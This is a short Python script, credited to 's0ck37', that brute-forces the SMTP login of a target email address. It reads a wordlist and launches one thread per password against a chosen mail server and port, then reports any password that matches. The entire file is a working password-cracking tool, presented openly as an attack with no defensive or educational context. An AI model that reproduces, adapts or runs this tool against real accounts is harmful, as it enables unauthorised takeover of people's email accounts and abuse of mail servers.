#By s0ck37
#Args: python3 smtpcracker.py wordlist.txt emailtocrack@domain.com smtp.example.server port

import smtplib,sys,threading,time
from colorama import Fore,Style,Back
from pyfiglet import Figlet

def main():
    tl = list()
    banner = Figlet(font='big')
    print(Style.BRIGHT + Fore.RED + banner.renderText("smtpcracker")+ Style.NORMAL + Fore.RESET)
    dict = open(sys.argv[1] , "r")
    pwds = dict.readlines()
    print(Fore.LIGHTGREEN_EX + "[+] Attack started"+Fore.RESET)
    for pwd in pwds:
        x = threading.Thread(target=try_login, args=(sys.argv[2],str(pwd).replace("\n","")))
        x.start()
        tl.append(x)
        print_charge(len(tl),len(pwds), Fore.BLUE + "[+] Attack launched" + Fore.RESET)
        time.sleep(0.3)
    for t in tl: t.join()
    print(Fore.LIGHTGREEN_EX + "[+] Attack finished" + Fore.RESET)
    dict.close()

def try_login(usr,pwd):
    try:
        server = smtplib.SMTP_SSL(sys.argv[3],int(sys.argv[4]))
        server.login(usr,pwd)
        print("\b"*80+" "*80+"\b"*81, end='',flush=True)
        print(Fore.BLUE + "[+] Password matched: "+ Fore.RED + pwd+ Fore.RESET)
        matched = True
        server.quit()
    except:
        pass

def print_charge(prog,total, fmsg):
    print("\b"*80+" "*80+"\b"*81, end='',flush=True)
    if prog == total:
        print(fmsg)
    else:
        print(Fore.LIGHTRED_EX, "\b["+str(prog)+"/"+str(total)+"]"+ Fore.BLUE+ " Launching attack..."+Fore.RESET ,end='', flush=True)

main()
